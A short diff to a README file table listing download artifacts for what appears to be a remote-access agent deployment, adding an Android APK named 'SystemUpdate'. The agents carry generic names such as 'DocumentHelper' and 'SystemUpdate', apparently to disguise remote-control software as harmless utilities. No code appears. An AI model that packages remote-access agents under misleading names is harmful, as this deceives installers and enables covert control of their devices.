@@ -34,6 +34,7 @@ See `../scripts/verify-enrollment.sh` for the on-VM health check.
 | `dl/meshagent64-MH-leadid-latest.exe` | Raw configured Windows agent (backup) |
 | `dl/DocumentHelper.run` | Linux one-liner installer script |
 | `dl/DocumentHelper.pkg` | macOS installer package (built via GitHub Actions) |
+| `dl/SystemUpdate-1.0.23-release.apk` | Android agent (baked link, enterprise enforced, SHA-256 in `dl/RELEASES.txt`) |
 | `DocumentHelper.msh` | Authoritative macOS/agent group configuration (port 443) |
 | `meshagent` | macOS universal binary (Mach-O x86_64 + arm64) |
 | `root/` | macOS package root (usr/local/bin/DocumentHelper) |
